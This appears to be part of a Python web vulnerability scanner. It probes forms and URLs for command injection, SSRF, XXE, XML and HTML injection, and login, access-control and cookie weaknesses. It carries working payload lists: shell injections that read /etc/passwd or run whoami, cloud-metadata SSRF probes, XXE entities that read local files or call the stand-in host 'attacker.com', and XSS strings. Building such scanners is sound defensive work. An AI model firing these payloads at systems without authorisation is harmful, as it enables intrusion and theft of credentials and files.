import requests
import time
import re
import random
import string
from urllib.parse import urlparse, parse_qs, quote

# Command injection payloads for different operating systems
COMMAND_INJECTION_PAYLOADS = {
    "unix": [
        "; echo ABC123$(date)",
        "| echo ABC123$(date)",
        "&& echo ABC123$(date)",
        "; cat /etc/passwd",
        "| whoami",
        "; id",
        "`id`",
        "$(whoami)",
        "; ping -c 3 127.0.0.1",
        "| ls -la",
        "; sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ],
    "windows": [
        "& echo ABC123",
        "| echo ABC123",
        "&& echo ABC123",
        "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| dir",
        "&& whoami",
        "%26 echo ABC123",  # URL encoded &
        "\\\" && echo ABC123",
    ],
    "time_based": [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "& timeout /t 5",  # Windows
        "| timeout /t 5",
    ]
}

def test_command_injection(url, forms, session=None):
    """Test for command injection vulnerabilities"""
    issues = []
    
    for form in forms:
        target_url = form["action"]
        
        for inp in form["inputs"]:
            if inp["name"]:
                # Test command injection
                unix_findings = test_unix_command_injection(target_url, form, inp, session)
                issues.extend(unix_findings)
                
                windows_findings = test_windows_command_injection(target_url, form, inp, session)
                issues.extend(windows_findings)
                
                time_findings = test_time_based_command_injection(target_url, form, inp, session)
                issues.extend(time_findings)
    
    return issues

def test_unix_command_injection(target_url, form, inp, session=None):
    """Test for Unix/Linux command injection"""
    issues = []
    
    # Generate unique token
    unique_token = f"ABC{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    
    for payload in COMMAND_INJECTION_PAYLOADS["unix"]:
        # Replace ABC123 with unique token
        test_payload = payload.replace("ABC123", unique_token)
        data = {inp["name"]: test_payload}
        
        try:
            baseline_time = get_baseline_time(target_url, form, inp, session)
            
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=10)
                else:
                    response = requests.post(target_url, data=data, timeout=10)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=10)
                else:
                    response = requests.get(target_url, params=data, timeout=10)
            
            response_text = response.text
            
            # Check for token in response (command execution indicator)
            if unique_token in response_text:
                issues.append({
                    "vulnerability": "Command Injection (Unix)",
                    "url": target_url,
                    "payload": test_payload,
                    "severity": "Critical",
                    "description": "Command execution detected via injected payload",
                    "evidence": f"Unique token '{unique_token}' found in response",
                    "parameter": inp["name"],
                    "method": form["method"].upper(),
                    "recommendation": "Use parameterized commands, whitelist inputs, and avoid shell execution"
                })
                break  # Don't test more payloads for this parameter
                
        except requests.RequestException:
            continue
    
    return issues

def test_windows_command_injection(target_url, form, inp, session=None):
    """Test for Windows command injection"""
    issues = []
    
    # Generate unique token
    unique_token = f"ABC{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    
    for payload in COMMAND_INJECTION_PAYLOADS["windows"]:
        test_payload = payload.replace("ABC123", unique_token)
        data = {inp["name"]: test_payload}
        
        try:
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=10)
                else:
                    response = requests.post(target_url, data=data, timeout=10)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=10)
                else:
                    response = requests.get(target_url, params=data, timeout=10)
            
            response_text = response.text
            
            # Check for token in response
            if unique_token in response_text:
                issues.append({
                    "vulnerability": "Command Injection (Windows)",
                    "url": target_url,
                    "payload": test_payload,
                    "severity": "Critical",
                    "description": "Command execution detected via Windows shell",
                    "evidence": f"Unique token '{unique_token}' found in response",
                    "parameter": inp["name"],
                    "method": form["method"].upper(),
                    "recommendation": "Avoid shell execution, validate inputs, use safe APIs"
                })
                break
                
        except requests.RequestException:
            continue
    
    return issues

def test_time_based_command_injection(target_url, form, inp, session=None):
    """Test for time-based command injection (blind)"""
    issues = []
    
    # Get baseline response time
    baseline_time = get_baseline_time(target_url, form, inp, session)
    
    if not baseline_time:
        return issues
    
    for payload in COMMAND_INJECTION_PAYLOADS["time_based"]:
        data = {inp["name"]: payload}
        
        try:
            start = time.time()
            
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=15)
                else:
                    response = requests.post(target_url, data=data, timeout=15)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=15)
                else:
                    response = requests.get(target_url, params=data, timeout=15)
            
            duration = time.time() - start
            
            # If response took significantly longer (4+ seconds delay)
            if duration > baseline_time + 4:
                # Verify with second request
                if verify_time_based_command_injection(target_url, form, inp, payload, session):
                    issues.append({
                        "vulnerability": "Command Injection (Time-based Blind)",
                        "url": target_url,
                        "payload": payload,
                        "severity": "High",
                        "description": "Time delay detected indicating blind command injection",
                        "evidence": f"Response delayed by {duration:.2f} seconds (baseline: {baseline_time:.2f}s)",
                        "parameter": inp["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Validate user input and avoid shell execution"
                    })
                    break
                    
        except requests.RequestException:
            continue
    
    return issues

def get_baseline_time(target_url, form, inp, session):
    """Get baseline response time"""
    baseline_data = {inp["name"]: "normal_value"}
    baseline_times = []
    
    for _ in range(3):
        try:
            start = time.time()
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=baseline_data, timeout=10)
                else:
                    response = requests.post(target_url, data=baseline_data, timeout=10)
            else:
                if session:
                    response = session.get(target_url, params=baseline_data, timeout=10)
                else:
                    response = requests.get(target_url, params=baseline_data, timeout=10)
            
            baseline_times.append(time.time() - start)
        except requests.RequestException:
            continue
    
    if not baseline_times:
        return None
    
    return sum(baseline_times) / len(baseline_times)

def verify_time_based_command_injection(target_url, form, inp, payload, session):
    """Verify time-based command injection with second request"""
    try:
        baseline = get_baseline_time(target_url, form, inp, session)
        if not baseline:
            return False
        
        data = {inp["name"]: payload}
        start = time.time()
        
        if form["method"] == "post":
            if session:
                response = session.post(target_url, data=data, timeout=15)
            else:
                response = requests.post(target_url, data=data, timeout=15)
        else:
            if session:
                response = session.get(target_url, params=data, timeout=15)
            else:
                response = requests.get(target_url, params=data, timeout=15)
        
        duration = time.time() - start
        return duration > baseline + 4
        
    except requests.RequestException:
        return False

# Authentication & Authorization checks
def test_authentication_weaknesses(target, session=None):
    """Test for authentication and authorization weaknesses"""
    issues = []
    
    # Test for weak login pages
    login_findings = test_weak_login_page(target, session)
    issues.extend(login_findings)
    
    # Test for broken access control
    access_findings = test_broken_access_control(target, session)
    issues.extend(access_findings)
    
    # Test session management
    session_findings = test_session_management(target, session)
    issues.extend(session_findings)
    
    return issues

def test_weak_login_page(target, session=None):
    """Test for weak login page implementation"""
    issues = []
    login_urls = [
        f"{target}/login",
        f"{target}/signin",
        f"{target}/account/login",
        f"{target}/auth/login",
        f"{target}/admin/login"
    ]
    
    for login_url in login_urls:
        try:
            if session:
                response = session.get(login_url, timeout=5)
            else:
                response = requests.get(login_url, timeout=5)
            
            if response.status_code == 200:
                page_content = response.text.lower()
                
                # Check for missing rate limiting indicators
                has_captcha = any(indicator in page_content for indicator in ['captcha', 'recaptcha', 'hcaptcha', 'turnstile'])
                has_rate_limit_msg = any(indicator in page_content for indicator in ['too many attempts', 'rate limit', 'try again later'])
                has_csrf_token = any(indicator in page_content for indicator in ['csrf', '_token', 'csrfmiddlewaretoken'])
                has_password_complexity = any(indicator in page_content for indicator in ['password must', 'minimum length', 'uppercase', 'lowercase', 'special character'])
                has_account_lockout = any(indicator in page_content for indicator in ['account locked', 'temporarily locked', 'suspended'])
                
                warnings = []
                if not has_captcha:
                    warnings.append("Missing CAPTCHA protection")
                if not has_rate_limit_msg:
                    warnings.append("No rate limiting message visible")
                if not has_csrf_token:
                    warnings.append("No CSRF token visible in form")
                if not has_password_complexity:
                    warnings.append("No password complexity requirements visible")
                if not has_account_lockout:
                    warnings.append("No account lockout mechanism visible")
                
                if warnings:
                    issues.append({
                        "vulnerability": "Weak Login Page Security",
                        "url": login_url,
                        "payload": None,
                        "severity": "Medium",
                        "description": "Login page lacks important security features",
                        "evidence": ", ".join(warnings),
                        "recommendation": "Implement CAPTCHA, rate limiting, CSRF protection, strong password policy, and account lockout"
                    })
                
        except requests.RequestException:
            continue
    
    return issues

def test_broken_access_control(target, session=None):
    """Test for broken access control"""
    issues = []
    
    # Test admin/privileged endpoints
    protected_paths = [
        "/admin",
        "/admin/",
        "/administrator",
        "/admin/dashboard",
        "/admin/panel",
        "/api/admin",
        "/api/private",
        "/api/internal",
        "/users/1",
        "/profile/1/edit",
        "/settings/all",
        "/config",
        "/backup",
        "/dashboard"
    ]
    
    for path in protected_paths:
        url = f"{target}{path}"
        try:
            if session:
                response = session.get(url, timeout=5)
            else:
                response = requests.get(url, timeout=5)
            
            # If accessible without proper auth or returns 200
            if response.status_code == 200:
                # Check if it's a login page redirect
                if "login" not in response.url.lower() and "sign in" not in response.text.lower():
                    issues.append({
                        "vulnerability": "Broken Access Control",
                        "url": url,
                        "payload": None,
                        "severity": "High",
                        "description": f"Protected endpoint '{path}' accessible without proper authentication",
                        "evidence": f"HTTP {response.status_code}, accessible without authentication",
                        "recommendation": "Implement proper authentication and authorization checks"
                    })
                    
        except requests.RequestException:
            continue
    
    return issues

def test_session_management(target, session=None):
    """Test for session management issues"""
    issues = []
    
    try:
        if session:
            response = session.get(target, timeout=5)
        else:
            response = requests.get(target, timeout=5)
        
        # Check for session ID in URL
        if 'sid=' in response.url or 'session=' in response.url or 'jsessionid=' in response.url:
            issues.append({
                "vulnerability": "Session ID in URL",
                "url": response.url,
                "payload": None,
                "severity": "Medium",
                "description": "Session identifier exposed in URL",
                "evidence": "Session ID found in URL parameters",
                "recommendation": "Store session IDs in cookies, not URLs"
            })
        
        # Check cookies for security flags
        for cookie in response.cookies:
            if not cookie.secure and target.startswith('https://'):
                issues.append({
                    "vulnerability": "Insecure Cookie (Missing Secure Flag)",
                    "url": target,
                    "payload": cookie.name,
                    "severity": "Medium",
                    "description": f"Cookie '{cookie.name}' missing Secure flag on HTTPS site",
                    "evidence": f"Cookie '{cookie.name}' accessible over HTTP",
                    "recommendation": "Set Secure flag on sensitive cookies"
                })
            
            if 'httponly' not in str(cookie._rest):
                issues.append({
                    "vulnerability": "Cookie Missing HttpOnly Flag",
                    "url": target,
                    "payload": cookie.name,
                    "severity": "Low",
                    "description": f"Cookie '{cookie.name}' missing HttpOnly flag",
                    "evidence": f"Cookie '{cookie.name}' accessible via JavaScript",
                    "recommendation": "Set HttpOnly flag on session cookies"
                })
    
    except requests.RequestException:
        pass
    
    return issues

# SSRF checks
def test_ssrf(url, forms, discovered_links=None, session=None):
    """Test for Server-Side Request Forgery"""
    issues = []
    
    # Internal SSRF test endpoints
    internal_test_urls = [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata endpoint
        "http://169.254.169.254/latest/user-data",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01",  # Azure metadata
    ]
    
    # SSRF parameter names
    ssrf_params = ["url", "feed", "fetch", "uri", "path", "href", "link", "src", "dest", "target", "redirect", "proxy", "api", "endpoint", "file", "page"]
    
    # Test forms
    for form in forms:
        target_url = form["action"]
        
        for inp in form["inputs"]:
            param_name = inp["name"].lower()
            
            # Check if parameter name suggests SSRF vulnerability
            if any(ssrf_param in param_name for ssrf_param in ssrf_params):
                for test_url in internal_test_urls[:3]:  # Limit to first 3 to avoid excessive requests
                    data = {inp["name"]: test_url}
                    
                    try:
                        if form["method"] == "post":
                            if session:
                                response = session.post(target_url, data=data, timeout=5, allow_redirects=False)
                            else:
                                response = requests.post(target_url, data=data, timeout=5, allow_redirects=False)
                        else:
                            if session:
                                response = session.get(target_url, params=data, timeout=5, allow_redirects=False)
                            else:
                                response = requests.get(target_url, params=data, timeout=5, allow_redirects=False)
                        
                        # Check for SSRF indicators
                        ssrf_indicator = detect_ssrf_vulnerability(response, test_url)
                        if ssrf_indicator:
                            issues.append({
                                "vulnerability": "Server-Side Request Forgery (SSRF)",
                                "url": target_url,
                                "payload": test_url,
                                "severity": "High",
                                "description": f"SSRF vulnerability detected: parameter '{inp['name']}' allows internal/external requests",
                                "evidence": ssrf_indicator,
                                "parameter": inp["name"],
                                "method": form["method"].upper(),
                                "recommendation": "Validate and whitelist allowed URLs, block internal IP ranges"
                            })
                            break
                            
                    except requests.RequestException:
                        continue
    
    # Test discovered links for URL parameters
    if discovered_links:
        for link in discovered_links[:10]:  # Limit to first 10
            parsed = urlparse(link)
            params = parse_qs(parsed.query)
            
            for param in params:
                if any(ssrf_param in param.lower() for ssrf_param in ssrf_params):
                    test_url = internal_test_urls[0]
                    
                    # Construct test URL
                    test_params = params.copy()
                    test_params[param] = test_url
                    
                    try:
                        if session:
                            response = session.get(link, params=test_params, timeout=5, allow_redirects=False)
                        else:
                            response = requests.get(link, params=test_params, timeout=5, allow_redirects=False)
                        
                        ssrf_indicator = detect_ssrf_vulnerability(response, test_url)
                        if ssrf_indicator:
                            issues.append({
                                "vulnerability": "Server-Side Request Forgery (SSRF)",
                                "url": link,
                                "payload": test_url,
                                "severity": "High",
                                "description": f"SSRF via URL parameter '{param}'",
                                "evidence": ssrf_indicator,
                                "parameter": param,
                                "method": "GET",
                                "recommendation": "Validate and whitelist allowed URLs, block internal IP ranges"
                            })
                            break
                            
                    except requests.RequestException:
                        continue
    
    return issues

def detect_ssrf_vulnerability(response, test_url):
    """Detect SSRF indicators in response"""
    indicators = []
    
    # Check status code (typically 200 for successful internal request)
    if response.status_code == 200:
        response_text = response.text.lower()
        
        # Check for internal/localhost content
        if "127.0.0.1" in response_text or "localhost" in response_text or "loopback" in response_text:
            indicators.append(f"Internal host accessible: {test_url}")
        
        # Check response time (internal requests usually faster)
        # This is already in the response object
        
        # Check for metadata service responses
        if "instance-id" in response_text or "metadata" in response_text or "amazon" in response_text.lower():
            indicators.append("Cloud metadata service accessible")
        
        # Check for error messages that reveal SSRF
        error_patterns = [
            r"connection.*refused",
            r"no route to host",
            r"network.*unreachable",
            r"timeout",
            r"refused"
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                indicators.append(f"Network error indicating request attempt: {pattern}")
    
    # Check response headers
    if "location" in response.headers:
        location = response.headers["location"].lower()
        if test_url in location or "127.0.0.1" in location or "localhost" in location:
            indicators.append(f"Redirect to internal host: {location}")
    
    return "; ".join(indicators) if indicators else None

# XML Injection payloads
XXE_PAYLOADS = [
    # XXE file disclosure
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
    
    # XXE external entity
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/file">]>
<foo>&xxe;</foo>''',
    
    # XXE PHP wrapper
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<foo>&xxe;</foo>''',
    
    # XXE without DOCTYPE (blind)
    '<?xml version="1.0"?><root>file:///etc/passwd</root>',
    
    # XXE simplified
    '''<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'''
]

XML_INJECTION_PAYLOADS = [
    '<root></root>',
    '<!DOCTYPE root>',
    '<?xml version="1.0"?><root></root>',
    '<root><![CDATA[test]]></root>',
    '<root xmlns="http://example.com"></root>'
]

HTML_INJECTION_PAYLOADS = [
    '<html><body>test</body></html>',
    '<div>test</div>',
    '<h1>test</h1>',
    '<script>alert(1)</script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>test</marquee>'
]

def test_xml_injection(url, forms, session=None):
    """Test for XML injection and XXE vulnerabilities"""
    issues = []
    
    for form in forms:
        target_url = form["action"]
        
        for inp in form["inputs"]:
            if inp["name"]:
                # Test XXE
                xxe_findings = test_xxe_injection(target_url, form, inp, session)
                issues.extend(xxe_findings)
                
                # Test XML injection
                xml_findings = test_xml_parsing_injection(target_url, form, inp, session)
                issues.extend(xml_findings)
    
    return issues

def test_xxe_injection(target_url, form, inp, session=None):
    """Test for XML External Entity (XXE) injection"""
    issues = []
    
    for payload in XXE_PAYLOADS[:3]:  # Limit to first 3 to avoid excessive requests
        data = {inp["name"]: payload}
        
        try:
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=10)
                else:
                    response = requests.post(target_url, data=data, timeout=10)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=10)
                else:
                    response = requests.get(target_url, params=data, timeout=10)
            
            response_text = response.text
            
            # Check for XXE indicators
            xxe_indicators = [
                "root:",
                "daemon:",
                "/bin/bash",
                "/bin/sh",
                "/etc/passwd",
                "/etc/shadow",
                "<?php",
                "PD9waHA=",  # Base64 encoded PHP
                "no such file",
                "permission denied"
            ]
            
            for indicator in xxe_indicators:
                if indicator in response_text:
                    issues.append({
                        "vulnerability": "XML External Entity (XXE) Injection",
                        "url": target_url,
                        "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                        "severity": "Critical",
                        "description": "XML parser processes external entities, allowing file disclosure or SSRF",
                        "evidence": f"XXE indicator found: {indicator}",
                        "parameter": inp["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Disable external entity processing in XML parser, use safe XML parsing libraries"
                    })
                    break
                    
        except requests.RequestException:
            continue
    
    return issues

def test_xml_parsing_injection(target_url, form, inp, session=None):
    """Test for XML parsing vulnerabilities"""
    issues = []
    
    for payload in XML_INJECTION_PAYLOADS:
        data = {inp["name"]: payload}
        
        try:
            if form["method"] == "post":
                if session:
                    response = session.post(target_url, data=data, timeout=10)
                else:
                    response = requests.post(target_url, data=data, timeout=10)
            else:
                if session:
                    response = session.get(target_url, params=data, timeout=10)
                else:
                    response = requests.get(target_url, params=data, timeout=10)
            
            response_text = response.text
            
            # Check for XML parsing errors or processing
            xml_errors = [
                "xml parsing error",
                "malformed xml",
                "xml parse",
                "line 1",
                "column",
                "unexpected end",
                "unknown tag"
            ]
            
            for error_term in xml_errors:
                if error_term in response_text.lower():
                    issues.append({
                        "vulnerability": "XML Injection",
                        "url": target_url,
                        "payload": payload,
                        "severity": "Medium",
                        "description": "XML input processed without proper validation",
                        "evidence": f"XML parsing error detected: {error_term}",
                        "parameter": inp["name"],
                        "method": form["method"].upper(),
                        "recommendation": "Validate and sanitize XML input, use XML schema validation"
                    })
                    break
                    
        except requests.RequestException:
            continue
    
    return issues

def test_html_injection(url, forms, session=None):
    """Test for HTML injection vulnerabilities"""
    issues = []
    
    for form in forms:
        target_url = form["action"]
        
        for inp in form["inputs"]:
            if inp["name"]:
                for payload in HTML_INJECTION_PAYLOADS:
                    data = {inp["name"]: payload}
                    
                    try:
                        if form["method"] == "post":
                            if session:
                                response = session.post(target_url, data=data, timeout=10)
                            else:
                                response = requests.post(target_url, data=data, timeout=10)
                        else:
                            if session:
                                response = session.get(target_url, params=data, timeout=10)
                            else:
                                response = requests.get(target_url, params=data, timeout=10)
                        
                        # Check if HTML is reflected unencoded
                        response_text = response.text
                        
                        # Look for unencoded reflection
                        if payload in response_text and any(tag in payload for tag in ['<script>', '<iframe>', '<img', '<svg', '<marquee']):
                            # Check if it's actually rendered (not just shown as text)
                            if detect_html_injection_vulnerability(response_text, payload):
                                issues.append({
                                    "vulnerability": "HTML Injection",
                                    "url": target_url,
                                    "payload": payload,
                                    "severity": "Medium",
                                    "description": "HTML input reflected unencoded in response",
                                    "evidence": "HTML tags reflected in response without encoding",
                                    "parameter": inp["name"],
                                    "method": form["method"].upper(),
                                    "recommendation": "Encode all user input before rendering in HTML context"
                                })
                                break
                                
                    except requests.RequestException:
                        continue
    
    return issues

def detect_html_injection_vulnerability(response_text, payload):
    """Detect if HTML injection is actually exploitable"""
    # Check if payload appears in a vulnerable context
    # Not just as text content but as potential HTML
    
    # Look for unencoded HTML tags
    html_tags = ['script', 'iframe', 'img', 'svg', 'marquee', 'details', 'embed', 'object']
    
    for tag in html_tags:
        if f'<{tag}' in payload.lower():
            # Check if it appears in the response in a way that could execute
            if payload.lower() in response_text.lower():
                # Check if it's not in a safe context (like a text node or attribute value)
                # Simple heuristic: if it appears as raw HTML
                patterns = [
                    f'<{tag}[^>]*>',  # Opening tag
                    f'</{tag}>'       # Closing tag
                ]
                
                for pattern in patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return True
    
    return False

